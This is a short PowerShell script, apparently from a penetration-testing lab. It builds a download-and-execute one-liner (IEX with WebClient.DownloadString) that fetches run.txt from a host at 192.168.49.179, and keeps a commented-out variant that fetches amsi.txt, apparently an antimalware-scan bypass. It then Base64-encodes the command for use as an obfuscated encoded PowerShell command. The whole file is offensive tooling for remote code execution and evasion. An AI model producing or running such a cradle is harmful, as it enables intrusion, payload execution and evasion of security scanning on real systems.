#$TEXTO = "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.49.179/amsi.txt')"
$TEXTO = "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.49.179/run.txt')"

$ENCODED1 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($TEXTO))
Write-Output $ENCODED1
